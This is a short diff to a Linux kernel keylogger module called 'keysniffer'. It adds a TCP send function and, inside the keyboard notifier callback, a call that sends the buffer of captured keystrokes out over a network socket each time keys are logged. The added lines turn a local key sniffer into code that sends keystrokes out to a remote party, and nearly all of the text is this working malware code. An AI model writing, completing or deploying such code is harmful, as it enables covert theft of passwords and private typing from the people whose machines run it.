@@ -51,6 +51,10 @@ static struct dentry *subdir;
 static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);
 static int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);
 
+
+// HERE
+int tcp_client_send(struct socket* sock, const char *buf, const size_t length, unsigned long flags);
+
 static const char *us_keymap[][2] = {
     {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
     {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
@@ -189,6 +193,12 @@ int keysniffer_cb(struct notifier_block *nblock,
     if (codes)
         keys_buf[buf_pos++] = '\n';
     pr_debug("%s\n", keybuf);
+
+
+    // HERE
+    // does keys_buf end with null byte?
+    tcp_client_send(conn_socket, keys_buf, strlen(keys_buf), MSG_DONTWAIT);
+
 
     return NOTIFY_OK;
 }
